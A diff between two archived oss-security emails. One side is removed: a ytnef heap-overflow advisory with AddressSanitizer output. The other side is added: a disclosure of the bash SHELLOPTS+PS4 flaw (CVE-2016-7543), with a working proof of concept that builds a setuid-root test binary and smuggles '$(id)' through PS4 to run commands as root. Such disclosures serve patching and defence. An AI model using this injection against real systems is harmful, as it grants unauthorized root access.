@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3713" "Wednesday" "7" "June" "2017" "12:53:43" "+0000" "Agostino Sarubbo" "ago@gentoo.org" "<55203.9275384857-sendEmail@localhost>" "98" "[oss-security] ytnef: heap-based-buffer overflow in SwapWord (ytnef.c)" "^Date:" nil nil "6" "2017060712:53:43" "[oss-security] ytnef: heap-based-buffer overflow in SwapWord (ytnef.c)" (number mark "        ago@gentoo.o Jun  7   98/3713  " thread-indent "\"[oss-security] ytnef: heap-based-buffer overflow in SwapWord (ytnef.c)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["788" "Monday" "26" "September" "2016" "17:43:25" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>" "25" "[oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4" nil nil nil "9" "2016092615:43:25" "[oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4" (number mark "U       up201407890@ Sep 26   25/788   " thread-indent "\"[oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 19978 invoked by uid 550); 7 Jun 2017 12:53:59 -0000
+Received: (qmail 3825 invoked by uid 550); 26 Sep 2016 15:50:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,111 +11,45 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 19857 invoked from network); 7 Jun 2017 12:53:58 -0000
-Message-ID: <55203.9275384857-sendEmail@localhost>
-MIME-Version: 1.0
-Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-175933.877545507"
-Date: Wed, 7 Jun 2017 12:53:43 +0000
-From: "Agostino Sarubbo" <ago@gentoo.org>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] ytnef: heap-based-buffer overflow in SwapWord (ytnef.c)
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-
-------MIME delimiter for sendEmail-175933.877545507
+Received: (qmail 32006 invoked from network); 26 Sep 2016 15:43:41 -0000
+Message-ID: <20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>
+Date: Mon, 26 Sep 2016 17:43:25 +0200
+From: up201407890@alunos.dcc.fc.up.pt
+To: oss-security@lists.openwall.com
+MIME-Version: 1.0
 Content-Type: text/plain;
-        charset="UTF-8"
+	charset=ISO-8859-1;
+	DelSp="Yes";
+	format="flowed"
+Content-Disposition: inline
 Content-Transfer-Encoding: 7bit
+User-Agent: Internet Messaging Program (IMP) H3 (4.2)
+X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
+Subject: [oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4
 
-Description:
-ytnef is Yeraze’s TNEF Stream Reader – for winmail.dat files.
+The recent bash 4.4 patched an old attack vector regarding
+specially crafted SHELLOPTS+PS4 environment variables
+against bogus setuid binaries using system()/popen().
 
-The complete ASan output of the issue:
+https://lists.gnu.org/archive/html/bug-bash/2016-09/msg00018.html
 
-# ytnefprint $FILE
-==22220==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000038 at pc 0x7ff75139d8eb bp 0x7ffeed684ad0 sp 0x7ffeed684ac8
-READ of size 1 at 0x602000000038 thread T0
-    #0 0x7ff75139d8ea in SwapWord /tmp/ytnef-1.9.2/lib/ytnef.c:153:28
-    #1 0x7ff75139d8ea in TNEFDateHandler /tmp/ytnef-1.9.2/lib/ytnef.c:682
-    #2 0x7ff7513b4b47 in TNEFParse /tmp/ytnef-1.9.2/lib/ytnef.c:1184:15
-    #3 0x7ff7513b39d3 in TNEFParseFile /tmp/ytnef-1.9.2/lib/ytnef.c:1042:10
-    #4 0x508814 in main /tmp/ytnef-1.9.2/ytnefprint/main.c:80:9
-    #5 0x7ff7504c978f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
-    #6 0x419c38 in _start (/usr/bin/ytnefprint+0x419c38)
+"nn. Shells running as root no longer inherit PS4 from the environment,
+closing a security hole involving PS4 expansion performing command
+substitution."
 
-0x602000000038 is located 0 bytes to the right of 8-byte region [0x602000000030,0x602000000038)
-allocated by thread T0 here:
-    #0 0x4cf7e0 in calloc /tmp/portage/sys-libs/compiler-rt-sanitizers-4.0.0/work/compiler-rt-4.0.0.src/lib/asan/asan_malloc_linux.cc:74
-    #1 0x7ff7513b472a in TNEFParse /tmp/ytnef-1.9.2/lib/ytnef.c:1154:12
-    #2 0x7ff7513b39d3 in TNEFParseFile /tmp/ytnef-1.9.2/lib/ytnef.c:1042:10
-    #3 0x508814 in main /tmp/ytnef-1.9.2/ytnefprint/main.c:80:9
-    #4 0x7ff7504c978f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
+# gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }'
+# chmod 4755 ./test
+# ls -l ./test
+-rwsr-xr-x. 1 root root 8549 Sep 10 18:06 ./test
+# exit
+$ env -i SHELLOPTS=xtrace PS4='$(id)' ./test
+uid=0(root)
+Sat Sep 10 18:06:36 WET 2016
 
-SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/ytnef-1.9.2/lib/ytnef.c:153:28 in SwapWord
-Shadow bytes around the buggy address:
-  0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-=>0x0c047fff8000: fa fa fd fa fa fa 00[fa]fa fa fa fa fa fa fa fa
-  0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-Shadow byte legend (one shadow byte represents 8 application bytes):
-  Addressable:           00
-  Partially addressable: 01 02 03 04 05 06 07 
-  Heap left redzone:       fa
-  Freed heap region:       fd
-  Stack left redzone:      f1
-  Stack mid redzone:       f2
-  Stack right redzone:     f3
-  Stack after return:      f5
-  Stack use after scope:   f8
-  Global redzone:          f9
-  Global init order:       f6
-  Poisoned by user:        f7
-  Container overflow:      fc
-  Array cookie:            ac
-  Intra object redzone:    bb
-  ASan internal:           fe
-  Left alloca redzone:     ca
-  Right alloca redzone:    cb
-==22220==ABORTING
-Affected version:
-1.9.2
+Sorry Tavis :P
 
-Fixed version:
-N/A
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
 
-Commit fix:
-N/A
-
-Credit:
-This bug was discovered by Agostino Sarubbo of Gentoo.
-
-CVE:
-CVE-2017-9471
-
-Reproducer:
-https://github.com/asarubbo/poc/blob/master/00243-ytnef-heapoverflow-SwapWord
-
-Timeline:
-2017-03-27: bug discovered and reported to upstream
-2017-05-24: blog post about the issue
-2017-06-07: CVE assigned
-
-Note:
-This bug was found with American Fuzzy Lop.
-
-Permalink:
-https://blogs.gentoo.org/ago/2017/05/24/ytnef-heap-based-buffer-overflow-in-swapword-ytnef-c/
-
---
-Agostino Sarubbo
-Gentoo Linux Developer
-
-
-------MIME delimiter for sendEmail-175933.877545507--
 
